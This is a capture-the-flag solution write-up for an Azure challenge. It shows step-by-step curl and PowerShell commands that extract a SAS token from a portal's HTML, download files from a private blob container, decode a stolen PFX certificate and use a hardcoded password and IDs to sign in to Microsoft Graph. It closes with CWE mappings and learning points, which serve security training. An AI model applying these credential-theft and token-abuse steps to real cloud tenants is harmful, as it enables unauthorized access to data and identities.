# Challenge 01 - Azure Combined Storage & Identity Solution

## Challenge Description

This combined challenge presents **two different attack vectors**:

1. **Basic Vector**: Direct access to public storage → Flag: `CLD[b8c4d0f3-5g9e-5b2c-ad4f-8g3b6e9c7f5d]`
2. **Advanced Vector**: MediCloudX Portal with SAS tokens → Flag: `CTF{m3d1cl0udx_4zur3_st0r4g3_s4s_t0k3n_3xf1ltr4t10n}`

---

## 🎯 Vector 1: Direct Access (Basic)

### Available Information
Based on Terraform outputs:
```bash
azure_storage_website_endpoint = "https://ctf25sa[suffix].z13.web.core.windows.net/"
azure_flag_url = "https://ctf25sa[suffix].z13.web.core.windows.net/flag.txt"
```

### Step-by-Step Solution

**Step 1: Access the flag directly**
```bash
# Simplest method - direct web access
curl https://ctf25sa[suffix].z13.web.core.windows.net/flag.txt
```

**Expected result:**
```
CLD[b8c4d0f3-5g9e-5b2c-ad4f-8g3b6e9c7f5d]
```

---

## 🔬 Vector 2: MediCloudX Research Portal (Advanced)

### Available Information
```bash
research_portal_url = "https://ctf25sa[suffix].blob.core.windows.net/research-portal/research-portal.html"
```

### Step-by-Step Solution

**Step 1: Access the Research Portal**
```bash
# Open the MediCloudX portal in browser
open https://ctf25sa[suffix].blob.core.windows.net/research-portal/research-portal.html
```

**Step 2: Inspect the Source Code**
```bash
# Download and examine the HTML
curl https://ctf25sa[suffix].blob.core.windows.net/research-portal/research-portal.html > research-portal.html

# Search for embedded SAS tokens
grep -i "sas" research-portal.html
grep -i "token" research-portal.html
```

**Step 3: Extract the SAS Token**
In the source code, you'll find an image with URL similar to:
```html
<img src="https://ctf25sa[suffix].blob.core.windows.net/medicloud-research/close-up-doctor-holding-red-heart.jpg?sv=2022-11-02&ss=b&srt=co&sp=rl&se=2026-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=[SIGNATURE]" />
```

**Step 4: Use SAS Token to Access Private Container**
```bash
# Extract the SAS token from the image URL
SAS_TOKEN="sv=2022-11-02&ss=b&srt=co&sp=rl&se=2026-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=[SIGNATURE]"

# List files in the private container
curl "https://ctf25sa[suffix].blob.core.windows.net/medicloud-research?restype=container&comp=list&${SAS_TOKEN}"
```

**Step 5: Download Sensitive Files**
```bash
# Download the flag from private container
curl "https://ctf25sa[suffix].blob.core.windows.net/medicloud-research/flag.txt?${SAS_TOKEN}"

# Download the base64 certificate
curl "https://ctf25sa[suffix].blob.core.windows.net/medicloud-research/certificadob64delpfx.txt?${SAS_TOKEN}" > cert.b64

# Download the PowerShell script
curl "https://ctf25sa[suffix].blob.core.windows.net/medicloud-research/script.ps1?${SAS_TOKEN}" > script.ps1
```

**Step 6: Use PowerShell for Advanced Access with Certificate**

```powershell
# Import Azure Storage module
Import-Module Az.Storage

# Configure storage account variables
$storageAccountName = "ctf25sace22f93a"  # Replace with actual name
$sasToken = "sv=2018-11-09&sr=c&st=2024-01-01T00:00:00Z&se=2026-12-31T23:59:59Z&sp=rl&spr=https&sig=sa5HBK837Jxz8q%2B20G%2B%2Fl0Uvf3ExRMLlStgqA38Gj%2BM%3D"

# Create storage context with SAS token
$context = New-AzStorageContext -StorageAccountName $storageAccountName -SasToken $sasToken

# List files in the private container
Get-AzStorageBlob -Container "medicloud-research" -Context $context

# Download specific files
$destinationPath = "./"
Get-AzStorageBlobContent -Blob "certificadob64delpfx.txt" -Container "medicloud-research" -Destination $destinationPath -Context $context
Get-AzStorageBlobContent -Blob "flag.txt" -Container "medicloud-research" -Destination $destinationPath -Context $context
Get-AzStorageBlobContent -Blob "script.ps1" -Container "medicloud-research" -Destination $destinationPath -Context $context

# Decode the PFX certificate
$base64FilePath = "C:\Users\Gerh\Desktop\EKOPARTY\certificadob64delpfx.txt"
$base64Content = Get-Content -Path $base64FilePath -Raw
$pfxBytes = [System.Convert]::FromBase64String($base64Content)
$outputPfxPath = "C:\Users\Gerh\Desktop\EKOPARTY\certdecode.pfx"
[System.IO.File]::WriteAllBytes($outputPfxPath, $pfxBytes)

# Configure variables for Azure AD authentication
$TenantId = "c390256a-8963-4732-b874-85b7b0a4d514"  # Replace with actual Tenant ID
$ClientId = "639a3cfa-93f6-43bf-ab93-fc48757e5ed1"  # Replace with actual Client ID
$Password = "M3d1Cl0ud25!"
$certPath = "C:\Users\Gerh\Desktop\EKOPARTY\certdecode.pfx"

# Load certificate with password
$clientCertificate = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2 -ArgumentList $certPath, $Password

# Connect to Microsoft Graph using certificate
Connect-MgGraph -ClientId $ClientId -TenantId $TenantId -Certificate $clientCertificate

# Verify successful connection
Get-MgContext
```

**Expected result:**
```
CTF{m3d1cl0udx_4zur3_st0r4g3_s4s_t0k3n_3xf1ltr4t10n}
```

---

## 📋 Vulnerability Summary

### Vector 1 (Basic)
- **CWE-200**: Exposure of sensitive information
- **Misconfiguration**: Public container without restrictions

### Vector 2 (Advanced)  
- **CWE-200**: SAS token exposed in client code
- **CWE-732**: Excessive permissions on SAS token
- **CWE-522**: Certificate stored in accessible location
- **CWE-521**: Weak certificate password

---

## 🎯 Learning Points

1. **Source code inspection**: Always review HTML/JS for embedded credentials
2. **SAS Tokens**: Tokens with excessive permissions and long expiration are dangerous
3. **Privilege escalation**: A read token can lead to full access
4. **Certificates in storage**: Never store certificates in accessible locations
5. **Defense in depth**: A single point of failure can compromise the entire system
